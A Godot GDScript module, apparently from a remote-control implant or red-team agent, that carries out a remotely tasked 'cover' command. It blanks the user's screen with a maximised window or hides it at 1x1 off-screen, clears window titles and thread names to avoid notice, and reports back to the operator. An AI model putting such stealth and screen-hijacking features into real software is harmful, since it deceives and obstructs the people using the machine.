extends Node

var display_size
var gui
var task_id

func _ready():
	display_size = Vector2(1024,768)

	gui = $".".get_node("CoverGUI")
	hide()

func show():
	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")

	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_MAXIMIZED)
	DisplayServer.window_set_size(DisplayServer.screen_get_size(0), 0)

	gui.show()
	gui.visible = true

func hide():
	gui.hide()

	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_MINIMIZED)
	DisplayServer.window_set_size(Vector2i(0,0), 0)

	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	get_window().size = Vector2(1,1)
	gui.position = Vector2(-1,-1)

func _on_tasking_cover(transport, task):

	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var state = float(parameters.get("state"))
	var output = "Cover Hidden"

	if state == 0:
		hide()
	else:
		show()
		output = "Cover Active - Hey, who turned out the lights?"

	transport.send(
		transport.create_task_response(
			true,
			false,
			task.get("id"),
			output,
		)
	)
